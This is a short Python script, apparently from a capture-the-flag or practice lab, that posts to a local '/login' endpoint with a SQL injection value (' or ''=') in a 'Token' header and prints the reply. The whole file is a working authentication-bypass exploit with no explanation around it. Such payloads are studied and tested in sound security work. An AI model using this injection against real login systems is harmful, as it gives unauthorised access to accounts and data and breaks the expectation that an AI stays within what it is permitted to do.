import requests

target = "http://localhost:55500"

req = requests.post(target + "/login", headers={"Token": "' or ''='"})

print(req.text)